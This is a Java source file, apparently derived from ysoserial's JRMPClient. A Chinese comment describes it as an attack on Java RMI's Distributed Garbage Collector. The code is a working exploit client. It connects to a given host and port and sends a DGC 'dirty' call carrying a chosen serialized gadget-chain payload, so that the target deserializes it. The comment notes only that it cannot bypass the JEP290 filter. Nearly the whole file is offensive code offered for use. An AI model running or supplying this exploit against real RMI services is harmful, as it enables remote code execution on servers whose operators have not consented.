package Rmi;


import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.UnknownHostException;

import javax.net.SocketFactory;

import sun.rmi.transport.TransportConstants;
import ysoserial.exploit.RMIRegistryExploit;
import ysoserial.payloads.ObjectPayload.Utils;


/*


 不能bypass JEP290 过滤机制 （DGCImpl中针对分布式垃圾收集器的）
 是由makeDGCCall函数发送生成的payload，攻击目标是由RMI侦听器实现的远程DGC（Distributed GarbageCollection，分布式垃圾收集器）。
 它可以攻击任何RMI侦听器，因为RMI框架采用DGC来管理远程对象的生命周期，通过与DGC通信的方式发送恶意payload让注册中心反序列化

 */
@SuppressWarnings ( {
    "restriction"
} )
public class JRMPClient {

    public static final void main ( final String[] args ) {
        if ( args.length < 4 ) {
            System.err.println(JRMPClient.class.getName() + " <host> <port> <payload_type> <payload_arg>");
            System.exit(-1);
        }

        Object payloadObject = Utils.makePayloadObject(args[2], args[3]);
        String hostname = args[ 0 ];
        int port = Integer.parseInt(args[ 1 ]);
        try {
            System.err.println(String.format("* Opening JRMP socket %s:%d", hostname, port));
            makeDGCCall(hostname, port, payloadObject);
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
        Utils.releasePayload(args[2], payloadObject);
    }

    public static void makeDGCCall ( String hostname, int port, Object payloadObject ) throws IOException, UnknownHostException, SocketException {
        InetSocketAddress isa = new InetSocketAddress(hostname, port);
        Socket s = null;
        DataOutputStream dos = null;
        try {
            s = SocketFactory.getDefault().createSocket(hostname, port);
            s.setKeepAlive(true);
            s.setTcpNoDelay(true);

            OutputStream os = s.getOutputStream();
            dos = new DataOutputStream(os);

            dos.writeInt(TransportConstants.Magic);
            dos.writeShort(TransportConstants.Version);
            dos.writeByte(TransportConstants.SingleOpProtocol);

            dos.write(TransportConstants.Call);

            @SuppressWarnings ( "resource" )
            final ObjectOutputStream objOut = new MarshalOutputStream(dos);

            objOut.writeLong(2); // DGC
            objOut.writeInt(0);
            objOut.writeLong(0);
            objOut.writeShort(0);

            objOut.writeInt(1); // dirty
            objOut.writeLong(-669196253586618813L);
            
            objOut.writeObject(payloadObject);

            os.flush();
        }
        finally {
            if ( dos != null ) {
                dos.close();
            }
            if ( s != null ) {
                s.close();
            }
        }
    }

    static final class MarshalOutputStream extends ObjectOutputStream {
        
        
        private URL sendUrl;

        public MarshalOutputStream (OutputStream out, URL u) throws IOException {
            super(out);
            this.sendUrl = u;
        }

        MarshalOutputStream ( OutputStream out ) throws IOException {
            super(out);
        }

        @Override
        protected void annotateClass ( Class<?> cl ) throws IOException {
            if ( this.sendUrl != null ) {
                writeObject(this.sendUrl.toString());
            } else if ( ! ( cl.getClassLoader() instanceof URLClassLoader ) ) {
                writeObject(null);
            }
            else {
                URL[] us = ( (URLClassLoader) cl.getClassLoader() ).getURLs();
                String cb = "";
                
                for ( URL u : us ) {
                    cb += u.toString();
                }
                writeObject(cb);
            }
        }


        /**
         * Serializes a location from which to load the specified class.
         */
        @Override
        protected void annotateProxyClass ( Class<?> cl ) throws IOException {
            annotateClass(cl);
        }
    }

 
}
